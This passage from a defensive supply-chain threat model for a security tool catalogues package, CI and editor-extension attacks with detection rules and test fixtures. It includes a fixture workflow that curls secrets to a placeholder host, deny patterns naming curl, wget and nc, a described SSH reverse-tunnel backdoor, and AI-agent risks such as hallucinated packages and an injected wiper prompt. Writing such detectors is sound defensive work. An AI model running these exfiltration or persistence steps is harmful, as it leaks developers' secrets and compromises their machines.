  - Files named like the published droppers (`setup_bun.js`, `bun_environment.js`, `setup.mjs` beside a large obfuscated JS file) inside `node_modules`.
  - An unexpected `~/.bun` install.
  - Detached `bun`/`node` processes after an install.
  - Your own packages showing patch releases you did not publish.
  - Read-only commands: `gh repo list --limit 500 --json name,createdAt,visibility`, `gh api user/repos --paginate -q '.[] | [.name,.created_at] | @tsv'`, `gh api repos/OWNER/REPO/actions/runners`, `npm view <your-pkg> time --json`, `git log --all --format='%H %an %ae %s' -- .claude .vscode .github/workflows`, `ls -la ~/.bun`, `ps -eo pid,ppid,lstart,cmd | grep -E 'bun|node'`.
- **Bigman today:** Partial.
  - The npm lifecycle findings would show the hook if the user inspects before installing.
  - `bigman canary arm` places a decoy credential file, and a home-wide secret sweep that reads it produces a verified read receipt. This is one of the few signals that works after the fact.
  - `bigman changes` watches `~/.bashrc`/`~/.zshrc`, which caught Nx's rc modification, but not repo-level hooks.
- **Proposed mitigation / detection:**
  1. Feed-driven IOC sweep `bigman sweep supply-chain`: match file names, SHA-256 hashes and package@version lists from a signed, user-updatable JSON bundle (generated from OSV `MAL-` records and vendor IOC tables) against `node_modules`, `~/.npm/_cacache` index entries, `~/.bun/install/cache`, lockfiles and running process command lines. Read-only, offline once the bundle is downloaded.
  2. Repo-check rules from SC-20/SC-21 applied to every git checkout under a user-chosen root, such as `~/src`.
  3. Additional canaries: decoy `.env` files in a decoy project directory and a decoy cloud-credentials file in a non-default path. Never modify real `~/.aws/credentials` or `~/.npmrc`.
  4. Guidance generator: when any worm IOC hits, produce a rotation checklist (npm, GitHub PATs and OAuth apps, SSH keys, cloud, Kubernetes, Vault, AI-tool API keys, CI secrets) and a "check your GitHub account for new public repos and runners" step.
- **Test case idea:** A temp tree with `node_modules/fixture-worm/package.json` (`"preinstall":"node setup_bun.js"`) and an empty `setup_bun.js`, plus a fixture IOC bundle listing that file name. Expect `ioc.filename`. A temp git repo with a commit adding `.claude/settings.json` containing a `SessionStart` hook that runs `echo fixture`. Expect `ai.agent-hook` (SC-21).
- **References:**
  - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
  - https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain
  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - https://www.infoworld.com/article/4095604/new-shai-hulud-worm-spreading-through-npm-github-2.html
  - T1195.001, T1552.001 https://attack.mitre.org/techniques/T1552/001/, T1567.001 https://attack.mitre.org/techniques/T1567/001/, T1485 https://attack.mitre.org/techniques/T1485/

### SC-07 Typosquatting and combosquatting
- **What it is:** Publishing a package whose name is a misspelling (`reqeusts`), a separator or scope variant (`python-dateutil` vs `dateutil`, `@scope/x` vs `scope-x`), or a plausible extension of a popular name (`opensearch-setup`, `fastlane-plugin-telegram-proxy`). Victims install it by mistake, copy it from a tutorial, or accept it from an AI assistant. Install hooks or import-time code then run. This is the highest-volume, lowest-sophistication attack across all registries.
- **Real-world examples:**
  - 2026-05-28: 14 npm packages from "vpmdhaj" imitating OpenSearch/Elasticsearch tooling, with inflated version numbers. https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/
  - 2025-05/06: RubyGems `fastlane-plugin-telegram-proxy` and `fastlane-plugin-proxy_teleram` proxied Telegram bot traffic. https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban
  - 2025-08: 60 RubyGems credential stealers (275,000 downloads since 2023). https://www.bleepingcomputer.com/news/security/60-malicious-ruby-gems-downloaded-275-000-times-steal-credentials/
  - 2025-02: Go `github.com/boltdb-go/bolt` typosquat of `boltdb/bolt` (see SC-14).
  - 2026-01: PyPI `spellcheckerpy`/`spellcheckpy` RAT (secondary reporting).
  - Research: Neupane et al. 2023 taxonomy of package confusion (USENIX Security).
- **What a defender inspects (indicators):**
  - Dependency names at Damerau-Levenshtein distance 1-2 from a top-N package, or differing only by `-`/`_`/`.`, a scope or a homoglyph.
  - Packages created within days, with a single maintainer, near-zero downloads, and a repository URL that points at the *popular* project's GitHub (metadata spoofing).
  - Version numbers far above any plausible history.
  - Read-only: `npm view <name> time maintainers repository --json`, `pip index versions <name>`, `pip download --no-deps --no-binary :all: <name> -d /tmp/x` (downloads, does not install; inspect offline).
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - Ship an offline, periodically refreshed list of the top ~5,000 names per ecosystem (derived from public download-count datasets), and flag `package.lookalike` (Review) for any dependency within edit distance 1 (2 for long names) or a separator/scope variant of a top name that is not itself in the list.
  - Apply the check in `bigman packages`, `--diff` mode and the browser extension's download scanning when a `.tgz`/`.whl`/`.gem` is downloaded.
  - Deterministic only: no reputation service.
- **Test case idea:** A fixture `package.json` depending on `expresss` and `lodash`. Expect one `package.lookalike` for `expresss` and none for `lodash`. A fixture `requirements.txt` with `reqeusts`.
- **References:**
  - https://www.usenix.org/conference/usenixsecurity23/presentation/neupane
  - https://arxiv.org/abs/2002.01139
  - https://github.com/DataDog/guarddog (typosquat heuristic)
  - T1195.001, T1036 https://attack.mitre.org/techniques/T1036/

### SC-08 Dependency confusion
- **What it is:** An organisation uses internal package names (on a private registry or index) that do not exist on the public registry. If the client is configured to search both, or uses `--extra-index-url` in pip, an attacker who publishes the same name publicly with a higher version can win resolution. Developer laptops that mix corporate and public configuration are a common place for this to fire.
- **Real-world examples:**
  - 2021-02: Alex Birsan's research reached internal builds at dozens of companies. https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
  - 2022-12-25 to 30: PyTorch nightly `torchtriton` was shadowed on PyPI and exfiltrated SSH keys, `.gitconfig` and `/etc/passwd`. https://pytorch.org/blog/compromised-nightly-dependency/
- **What a defender inspects (indicators):**
  - `pip config list` and `/etc/pip.conf`, `~/.config/pip/pip.conf`, `uv.toml`/`pyproject [tool.uv]` using `extra-index-url` (merges indexes) rather than a single index or uv's index pinning.
  - `.npmrc` with an internal registry but unscoped internal package names.
  - `go env GOPRIVATE GONOSUMDB GONOSUMCHECK GOFLAGS GOPROXY`.
  - Lockfile `resolved` hosts that change from internal to public between versions.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - Doctor `pm.index-config` (Review): report `extra-index-url` usage, unscoped packages in a project whose `.npmrc` routes some scope to a private registry, and Go `GOFLAGS=-insecure` or `GONOSUMDB=*`.
  - In `--diff` mode: `package.registry-changed` when a package's resolved host changes.
- **Test case idea:** A fake HOME with `~/.config/pip/pip.conf` containing `extra-index-url = https://internal.example.invalid/simple`. Expect `pm.index-config`.
- **References:**
  - https://pytorch.org/blog/compromised-nightly-dependency/
  - https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
  - https://pnpm.io/supply-chain-security (`namedRegistries`)
  - T1195.001

### SC-09 Slopsquatting (AI-hallucinated package names)
- **What it is:** Code-generating LLMs sometimes recommend packages that do not exist, and some hallucinated names recur across prompts and models. Attackers can register those names and wait for developers, or autonomous coding agents, to install them. It is typosquatting without the typo: the name looks entirely plausible, so name-distance checks miss it.
- **Real-world examples:**
  - Research: Spracklen et al., USENIX Security 2025, analysed 576,000 generated samples from 16 LLMs and found hallucinated packages are frequent and partly repeatable. https://arxiv.org/abs/2406.10279
  - 2025-10: PhantomRaven reportedly chose names that LLMs tend to suggest. https://www.sonatype.com/blog/phantomraven-npm-malware
- **What a defender inspects (indicators):**
  - New dependencies with a very recent first publish date, a single version, no repository link or a repository that does not mention the package name, and near-zero downloads.
  - Dependencies added in commits authored by AI agents (`Co-Authored-By` trailers, agent bot identities).
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - `--diff` mode `package.new-dependency` with an optional (explicit, networked) metadata lookup that flags `package.young` when the first publish is less than N days old or the package has fewer than K versions.
  - Document the release-age cooldowns (SC-05) as the primary control.
  - Advise agent users to require human approval for dependency additions. The repo-check (SC-21) can report whether an agent configuration auto-approves `npm install`/`pip install` commands.
- **Test case idea:** A lockfile diff fixture adding one package plus a canned registry-metadata JSON showing `created` one day before the test clock. Expect `package.young`.
- **References:**
  - https://arxiv.org/abs/2406.10279
  - https://socket.dev/blog/npm-introduces-minimumreleaseage-and-bulk-oidc-configuration
  - T1195.001

### SC-10 Abandoned-package revival and expired maintainer domain takeover
- **What it is:** When a package is deleted, some registries let anyone re-register the name ("revival hijack"). Existing projects that still depend on it then pull whatever the new owner publishes. Separately, if a maintainer's email domain expires, an attacker can register it, receive the password-reset email and take over the account.
- **Real-world examples:**
  - 2022-05: the PyPI `ctx` package was taken over via an expired maintainer domain, and the new versions exfiltrated environment variables. https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html
  - 2024-09: JFrog "Revival Hijack" found about 22,000 removed PyPI names re-registrable, with in-the-wild abuse (`pingdomv3`). https://jfrog.com/blog/revival-hijack-pypi-hijack-technique-exploited-22k-packages-at-risk/
  - 2025-08-18: PyPI now checks domain expiry daily and unverifies addresses on lapsed domains (1,800+ since June 2025). https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/
  - Research: Zahan et al. 2022 measured npm maintainers with expired email domains. https://arxiv.org/abs/2112.10165
- **What a defender inspects (indicators):** Dependencies whose latest release is years old but which suddenly publish a new version; a change of maintainer set; packages that disappeared and reappeared; for maintainers, whether their own account email is on a personal domain with an approaching expiry.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - In `--diff` mode with optional registry metadata: `package.maintainer-change` and `package.dormant-revival` (new release after more than 2 years with no versions).
  - Feed-driven advisories from OSV/OpenSSF malicious-packages.
  - Maintainer guidance page: use a long-lived email domain or a major provider, enable phishing-resistant 2FA, and add a second verified email.
- **Test case idea:** Two canned metadata JSONs for the same package: the old one has maintainer `a` and last publish in 2019; the new one has maintainer `b` and a publish in 2026. Expect both findings.
- **References:**
  - https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/
  - https://thehackernews.com/2024/09/hackers-hijack-22000-removed-pypi.html
  - https://arxiv.org/abs/2112.10165
  - T1195.001

### SC-11 Protestware and maintainer sabotage
- **What it is:** A legitimate maintainer intentionally ships destructive or disruptive behaviour: infinite loops, file overwrites for certain geolocations, or political messages written to disk. It needs no compromise, so signatures, provenance and 2FA do not help. Only review, pinning and release-age delays reduce exposure.
- **Real-world examples:**
  - 2022-01: `colors` 1.4.44-liberty-2 and `faker` 6.6.6 were broken by their author with an infinite loop. https://www.bleepingcomputer.com/news/security/dev-corrupts-npm-libs-colors-and-faker-breaking-thousands-of-apps/
  - 2022-03: `node-ipc` 10.1.1-10.1.2 overwrote files on hosts geolocated to Russia/Belarus (CVE-2022-23812), and `peacenotwar` wrote files to the desktop. https://github.com/advisories/GHSA-97m3-w2cp-4xx6, https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/
  - 2026-05-14: node-ipc again had three malicious versions flagged (reported by StepSecurity per secondary sources; details unverified here).
- **What a defender inspects (indicators):** Code paths gated on locale, timezone, IP geolocation lookups or the presence of specific desktop paths. Writes to `~/Desktop` or `~/OneDrive`. Unbounded loops in install or import paths.
- **Bigman today:** Partial: `bigman audit osv` reports the advisory once filed.
- **Proposed mitigation / detection:** A `js.geo-conditional` rule (Review) for references to IP-geolocation services or `Intl.DateTimeFormat().resolvedOptions().timeZone` combined with filesystem writes in lifecycle or entry files. Release-age cooldown guidance (SC-05).
- **Test case idea:** A fixture JS file containing both a geolocation-API hostname string and `fs.writeFileSync`, inert. Expect `js.geo-conditional`.
- **References:**
  - https://github.com/advisories/GHSA-97m3-w2cp-4xx6
  - T1485, T1565 (Data Manipulation)

### SC-12 Compromised hosted script or CDN dependency
- **What it is:** Web projects that load third-party JavaScript at runtime from a CDN or vendor domain inherit whatever that domain serves later. A change of domain ownership or a compromised loader library turns every embedding site into a distribution point. For a maintainer this affects project websites, docs sites and Electron/desktop apps that load remote scripts. The browser-side impact belongs to [phishing](./01-phishing-social-engineering.md).
- **Real-world examples:**
  - 2024-06: the polyfill.io domain was sold, and the new owner served malicious redirects to more than 100,000 sites. https://sansec.io/research/polyfill-supply-chain-attack
  - 2023-12: Ledger connect-kit was loaded at runtime via CDN by dApps (SC-05).
- **What a defender inspects (indicators):** `<script src="https://...">` tags to third-party domains without an `integrity=` (SRI) attribute in project HTML and templates; unpinned CDN URLs (`@latest`, no version); Electron `loadURL` of remote content.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:** A `web.unpinned-remote-script` rule (Review) in a repo-check that scans `*.html`, `*.htm`, `*.vue`, `*.svelte`, `*.jsx`/`*.tsx` and templates for external script tags lacking `integrity`. Feed-driven list of known-compromised script domains (for example `polyfill.io`, `bootcss.com`, `bootcdn.net`, `staticfile.org`, as listed in the Sansec write-up).
- **Test case idea:** A fixture `index.html` with one SRI-pinned script and one `https://cdn.example.invalid/x.js` without integrity. Expect exactly one finding.
- **References:**
  - https://sansec.io/research/polyfill-supply-chain-attack
  - T1195.002 https://attack.mitre.org/techniques/T1195/002/, T1189 (Drive-by Compromise)

### SC-13 Lockfile tampering and integrity drift
- **What it is:** Lockfiles are large, machine-generated and rarely reviewed in pull requests. A malicious or careless PR can change a `resolved` URL to an attacker host, drop or alter an `integrity` hash, or add a package that does not match `package.json`. When CI and other contributors install from the lockfile, they receive the substituted artifact. Lockfile diffs were also the best forensic source in the 2026 axios case, because the dropper removed its own files.
- **Real-world examples:**
  - 2019: Liran Tal (Snyk) described lockfile injection, and `lockfile-lint` was created in response. https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/, https://github.com/lirantal/lockfile-lint
  - 2026-03: axios. The malicious dependency was "visible only in `package-lock.json`" according to Trend's write-up.
- **What a defender inspects (indicators):**
  - `resolved` hosts other than the configured registry.
  - Missing `integrity` fields.
  - `http:` URLs.
  - Lockfile entries for packages not reachable from `package.json`.
  - pnpm `tarball:` entries.
  - `yarn.lock` `resolved` hosts.
  - Mismatches between `Cargo.lock` `checksum` and the crates.io index.
  - Read-only: `npx lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https` (runs a published tool), `git log -p -- package-lock.json`, `npm ci --dry-run --ignore-scripts`.
- **Bigman today:** Partial. `package.unresolved-hook` reads `package-lock.json` for install-script flags only.
- **Proposed mitigation / detection:** Native lockfile linter in `bigman packages`:
  - `lock.foreign-host` (High), `lock.no-integrity` (Review), `lock.insecure-url` (High) and `lock.orphan` (Info) for `package-lock.json` v2/v3, `pnpm-lock.yaml`, `yarn.lock` (classic and Berry) and `bun.lock` (text).
  - For `Cargo.lock`: `source` other than crates.io or a git source without a commit pin.
  - For `uv.lock`/`poetry.lock`: non-PyPI sources.
  - Pure parsing, no network.
- **Test case idea:** A fixture `package-lock.json` with three packages: a normal registry entry, an entry with `resolved: "https://example.invalid/a.tgz"`, and an entry without `integrity`. Expect `lock.foreign-host` and `lock.no-integrity`.
- **References:**
  - https://github.com/lirantal/lockfile-lint
  - https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/
  - T1195.001

### SC-14 Registry and proxy-specific persistence (Go module proxy, RubyGems, Cargo)
- **What it is:** Each ecosystem has its own trust quirks.
  - **Go:** the public module proxy caches a module version indefinitely. An attacker can publish a backdoored tagged version, let the proxy cache it, then rewrite the git tag to clean code, so reviewers reading GitHub see nothing while `go get` keeps serving the cached malicious version. `go.sum` and the checksum database guarantee consistency, not benign content.
  - **RubyGems:** gems can carry native extensions (`extconf.rb`) that run at install.
  - **Cargo:** tooling bugs in archive extraction can matter (SC-04).
- **Real-world examples:**
  - 2025-02: Socket found `github.com/boltdb-go/bolt`, a 2021 typosquat with a remote-access backdoor that persisted via the Go module mirror after the repo tag was cleaned. https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence, https://thehackernews.com/2025/02/malicious-go-package-exploits-module.html
  - 2025: RubyGems typosquats (SC-07).
  - 2026: Cargo CVE-2026-33056 / CVE-2026-5223 (SC-04).
- **What a defender inspects (indicators):** For Go: module paths in `go.mod` whose owner differs from the canonical project; `go env GOPROXY GOSUMDB GONOSUMDB GOFLAGS`; `go mod verify` (read-only checksum check against `go.sum`); comparing the proxy's `.info`/`.zip` for a version against the repo tag. For Ruby: `gem specification <gem> extensions`, `Gemfile.lock` sources.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - `bigman packages` for Go: parse `go.mod`/`go.sum` and flag `go.lookalike-path` when the module path differs from a known-popular path only in the owner segment (`boltdb-go/bolt` vs `boltdb/bolt`).
  - For Ruby: parse `.gem` (tar containing `metadata.gz` and `data.tar.gz`) and flag `gem.extension` when the gemspec declares extensions, and `gem.install-hook` for `Gem.post_install` hooks in `rubygems_plugin.rb`.
  - Doctor: toolchain versions against feed advisories (Cargo, Go, npm, pip).
- **Test case idea:** A fixture `go.mod` requiring `github.com/boltdb-go/bolt v1.3.1` with an allowlist containing `github.com/boltdb/bolt`. Expect `go.lookalike-path`. A hand-built `.gem` fixture with `extensions: ["ext/extconf.rb"]` in its metadata.
- **References:**
  - https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence
  - https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban
  - T1195.001

### SC-15 Compromised or retagged third-party GitHub Actions and CI tools
- **What it is:** Workflows usually reference actions by mutable tags (`@v4`). Anyone who controls the action's repository, including an attacker with a stolen token, can force-push a tag to malicious code. Every workflow using the tag then runs it with that workflow's secrets and `GITHUB_TOKEN`. The same applies to CI tools installed unpinned (`latest`). Compromising a widely used *security* tool is especially effective because it runs in release pipelines that hold publish tokens.
- **Real-world examples:**
  - 2025-03-14/15: `tj-actions/changed-files` tags were repointed to code that dumped runner memory secrets into public build logs (CVE-2025-30066, about 23,000 repos), enabled by the earlier `reviewdog/action-setup@v1` compromise (CVE-2025-30154). https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066, https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
  - 2026-03-19 to 23: TeamPCP / Trivy (CVE-2026-33634). The attackers released a malicious `trivy` v0.69.4, force-pushed 76 of 77 `trivy-action` tags and all 7 `setup-trivy` tags, and pushed v0.69.5/0.69.6 images to Docker Hub with separately stolen credentials. The payload read `Runner.Worker` memory, swept 50+ credential paths, and fell back to a `tpcp-docs-*` public repo. Stolen tokens cascaded into Checkmarx KICS/AST actions and LiteLLM on PyPI. https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23, https://www.kaspersky.com/blog/critical-supply-chain-attack-trivy-litellm-checkmarx/55510/, https://labs.cloudsecurityalliance.org/research/csa-research-note-teampcp-cicd-supply-chain-20260403-csa-sty/
- **Ecosystem defenses:**
  - Pin actions to full commit SHAs.
  - GitHub's Actions policy can enforce SHA pinning and block specific actions (2025-08-15). https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/
  - Minimal `permissions:`.
  - zizmor (static analysis of workflows). https://github.com/zizmorcore/zizmor
- **What a defender inspects (indicators):**
  - `uses: owner/repo@<tag-or-branch>` (not a 40-hex SHA) in `.github/workflows/*.yml` and composite `action.yml`.
  - Tools installed in CI with `latest` or without checksum or signature verification.
  - Workflows lacking a top-level `permissions:` block.
  - Read-only: `grep -RnE 'uses:\s*[^@]+@(v?[0-9.]+|main|master)\s*$' .github/`, `zizmor .github/workflows`.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - Repo-check rules: `gha.unpinned-action` (Review; High when the workflow also has `secrets.*` or `id-token: write`), `gha.no-permissions` (Info), and `gha.unpinned-tool` (Review) for `curl ... | sh` installers in `run:`, reusing `shell.*` rules on each `run:` block.
  - Feed-driven `gha.known-compromised` list (action@ref ranges from GHSA) matched against workflows in local checkouts.
- **Test case idea:** A fixture workflow using `actions/checkout@v4` and `tj-actions/changed-files@v45` and referencing `secrets.NPM_TOKEN`. Expect two `gha.unpinned-action` findings and a `gha.known-compromised` from a fixture advisory bundle.
- **References:**
  - https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
  - https://github.com/zizmorcore/zizmor
  - T1195.002, T1677 Poisoned Pipeline Execution https://attack.mitre.org/techniques/T1677/

### SC-16 `pull_request_target`, script injection and cache poisoning ("pwn requests")
- **What it is:** `pull_request_target` workflows run in the context of the base repository, with its secrets and a write-capable token, even when triggered by a fork. If such a workflow checks out the PR's code, or interpolates attacker-controlled fields (PR title, branch name, issue body) directly into `run:` shell steps, outsiders can execute code with maintainer privileges. Attackers can also poison the shared Actions cache that later release workflows restore, pivoting from an unprivileged job to the publish job.
- **Real-world examples:**
  - 2024-12: Ultralytics. Branch-name injection in a `pull_request_target` workflow led, via the build cache, to stolen PyPI publishing. https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/, https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection
  - 2025-08-24/26: Nx. PR-title injection in a `pull_request_target` workflow left on stale branches exfiltrated the npm token. https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
  - 2026-05-11: TanStack. A fork PR triggered `pull_request_target`, followed by cache poisoning and OIDC token extraction from runner memory. The published packages had valid SLSA provenance. https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - 2026-07-14: AsyncAPI. Malicious commits were pushed to unprotected pre-release branches that triggered release workflows (same source).
- **What a defender inspects (indicators):**
  - Workflows with `on: pull_request_target` or `workflow_run` that also `actions/checkout` a ref from `github.event.pull_request.head.*`.
  - `${{ github.event.pull_request.title }}`, `.head_ref`, `.body`, `github.event.issue.*` or `github.event.comment.body` used inside `run:`.
  - Release or publish workflows that restore caches (`actions/cache`, `setup-*` with `cache:`).
  - Release triggers on branches without protection.
  - Stale branches still containing removed workflows.
  - Read-only: `zizmor`, `grep -Rn 'pull_request_target' .github/workflows`, `git branch -r --contains <commit-that-removed-workflow>`, and `git for-each-ref` to list branches that still contain a file.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:** Repo-check rules:
  - `gha.prt-checkout` (High): `pull_request_target`/`workflow_run` combined with checkout of PR head.
  - `gha.expression-injection` (High): untrusted `github.event.*` fields inside `run:`.
  - `gha.release-cache` (Review): cache restore in a workflow that has `id-token: write` or references publish secrets.
  - `gha.stale-branch-workflow` (Review): a dangerous workflow present on non-default branches (uses `git ls-tree`, read-only).
  - Borrow zizmor's audit list and cite it; consider shelling out to zizmor when installed, like OSV-Scanner today.
- **Test case idea:** A fixture workflow with `on: pull_request_target` and a `run: echo "${{ github.event.pull_request.title }}"` step. Expect `gha.expression-injection` and `gha.prt-checkout` (if a checkout of head is present). No workflow is executed.
- **References:**
  - https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
  - https://github.com/zizmorcore/zizmor
  - https://attack.mitre.org/techniques/T1677/

### SC-17 Malicious workflow commits pushed with stolen accounts (GhostAction)
- **What it is:** With a stolen GitHub token or session, an attacker commits a new workflow (often named to look like a security or formatting check) that reads every repository secret and sends it out. Even a short-lived commit runs once on push. Shai-Hulud-family worms use the same technique to dump Actions secrets as artifacts.
- **Real-world examples:**
  - 2025-09-05: GhostAction. 327 users, 817 repositories, 3,325 secrets (PyPI, npm, Docker Hub, cloud), via workflows disguised as "Github Actions Security". https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/, https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
  - 2026-04: the `@bitwarden/cli` wave injected a `format-check.yml` to dump secrets. https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - A reported October 2026 GhostAction resurgence is unverified.
- **What a defender inspects (indicators):** New files under `.github/workflows/` from unexpected authors; workflows that reference many `secrets.*` and make outbound `curl`/`wget` calls; workflow runs triggered by pushes to non-default branches; the repository's audit log for new deploy keys or PATs. Read-only: `git log --diff-filter=A --format='%h %an %ae %ad' -- .github/workflows`, `gh run list --limit 50`, `gh api repos/OWNER/REPO/actions/secrets` (names only).
- **Bigman today:** Gap. The startup baseline (`bigman changes`) does not cover repositories.
- **Proposed mitigation / detection:**
  - Repo-check `gha.secret-exfil-shape` (High): a single `run:` step that references two or more `secrets.*` and contains `curl`/`wget`/`nc` (reusing `shell.download`/`shell.network-listener`).
  - An opt-in "watched repos" baseline: hash `.github/workflows/*`, `.claude/`, `.vscode/` and `.git/hooks` per configured repo, and report diffs in `bigman changes` the same way startup files are baselined today.
- **Test case idea:** A fixture workflow with `run: curl -d "${{ secrets.A }}${{ secrets.B }}" https://example.invalid`. Expect `gha.secret-exfil-shape`. A temp repo baseline, then add a workflow and expect a `changes.repo-workflow` diff.
- **References:**
  - https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/
  - T1677, T1567

### SC-18 Poisoned or stale container images
- **What it is:** Developers pull images by mutable tag (`:latest`, `:0.69`) from public registries and run them with mounted source trees, sockets or credentials. A stolen registry credential lets an attacker push a malicious image under a trusted tag. Lookalike repositories and "imageless" spam repositories host malware or phishing. Old images can keep known-backdoored packages long after the distro fixed them.
- **Real-world examples:**
  - 2026-03-22/23: Docker Hub `aquasec/trivy` 0.69.5/0.69.6 were pushed with stolen credentials and had no matching GitHub release. Images referenced by digest were unaffected. https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
  - 2025-08: Binarly found Debian-based Docker Hub images (and derived images) still containing the xz-utils backdoor (CVE-2024-3094). https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images
  - 2024-04: JFrog found about 20% of Docker Hub repositories (roughly 3 million) hosting malware or phishing content rather than real images. https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/
- **What a defender inspects (indicators):**
  - `image:` / `FROM` lines without `@sha256:` digests in `Dockerfile`, `Containerfile`, `compose.yaml`, `.devcontainer/devcontainer.json` and CI files.
  - Images from personal namespaces that shadow official names.
  - Local image inventory.
  - Signature status.
  - Read-only: `podman images --digests`, `docker images --digests`, `podman image inspect --format '{{.Created}} {{.RepoDigests}}' IMG`, `cosign verify --certificate-identity ... IMG` (verification only), `podman image trust show`, `grep -RnE '^\s*FROM\s+[^@]+$' --include=Dockerfile --include=Containerfile .`.
- **Bigman today:** Gap. ClamAV file scanning can scan an exported image tarball, but there is no image-aware workflow.
- **Proposed mitigation / detection:**
  - Repo-check `container.unpinned-image` (Review) and `container.lookalike-namespace` (Review, edit distance to official images).
  - Doctor: list local images with created date older than N months as `container.stale-image` (Info), with guidance to rebuild.
  - Optional integration: run `osv-scanner` or `trivy` (if the user trusts it, pinned by digest) on an image tarball; Bigman should never auto-pull.
- **Test case idea:** A fixture `Dockerfile` with `FROM debian:bookworm` and another with `FROM debian@sha256:<64 hex>`. Expect one finding.
- **References:**
  - https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images
  - https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/
  - T1610 (Deploy Container), T1195.002
  - Cross-reference: [distro packaging](./03-distro-packaging-and-install-channels.md) for xz-utils

### SC-19 Malicious or hijacked VS Code / Open VSX extensions
- **What it is:** Editor extensions run as Node.js code with the user's full privileges, can activate on startup (`"activationEvents": ["*"]` or `onStartupFinished`), and auto-update silently. Attackers publish lookalike extensions, steal or find leaked publisher tokens to push malicious updates to legitimate ones, chain installs through `extensionPack`/`extensionDependencies`, and hide code with invisible Unicode. VS Code forks (Cursor, Windsurf, VSCodium, Antigravity) use Open VSX, which has had less vetting, and some recommended extension IDs that did not exist there, leaving the namespaces claimable.
- **Real-world examples:**
  - 2025-10: Wiz found 550+ leaked secrets in 500+ extensions, including 100+ valid VS Marketplace and 30+ Open VSX publish tokens. https://www.wiz.io/blog/supply-chain-risk-in-vscode-extension-marketplaces, https://thehackernews.com/2025/10/over-100-vs-code-extensions-exposed.html
  - 2025-10 onward: GlassWorm on Open VSX used leaked tokens and invisible-Unicode code. Open VSX revoked the tokens, declared the incident contained on 2025-10-21, and announced shorter token lifetimes and publish-time scanning. https://blogs.eclipse.org/post/mika%C3%ABl-barbero/open-vsx-security-update-october-2025
  - Later GlassWorm waves (2026-01 account takeover; 2026-03 transitive spread via `extensionPack`/`extensionDependencies`, about 72 extensions; 2026-04 about 73 "sleeper" extensions) are reported mainly by secondary sources. The primary Koi blog URLs now redirect to a vendor page, so the exact counts are unverified here.
  - 2025-07-17: the Amazon Q Developer extension 1.84.0 shipped an injected wiper-style prompt from a malicious PR (inert due to a bug; CVE-2025-8217). https://aws.amazon.com/security/security-bulletins/AWS-2025-015/, https://research.jfrog.com/post/amazon-q-vs-code-extension-compromised-with-malicious-code/
  - 2025-12/2026-01: Koi showed Cursor/Windsurf/Antigravity/Trae recommending extension IDs absent from Open VSX. Vendors patched; Windsurf status unclear (secondary reporting).
  - 2026-10-29: a tampered `anthropic.claude-code` 2.1.312/2.1.313 was served from the Cursor marketplace for about 11 hours. Its loader ran at module load, before the real extension code, using only Node.js and built-in tools. It recorded host details and the names (not values) of secret-looking environment variables, appended an Ed25519 key with comment `svc-telemetry` to `authorized_keys`, tried to enable sshd, held an outbound `ssh -N -R '*:0:localhost:22'` tunnel (autossh preferred, host-key checks off), and persisted through a user crontab `@reboot` entry and `~/.config/.smt`/`.smtk`. Microsoft found no sign it reached the VS Marketplace or npm. https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
- **What a defender inspects (indicators):**
  - Installed extensions and versions (`~/.vscode/extensions/`, `~/.vscode-oss/extensions/`, `~/.cursor/extensions/`, `~/.windsurf/extensions/`, `extensions.json` in each).
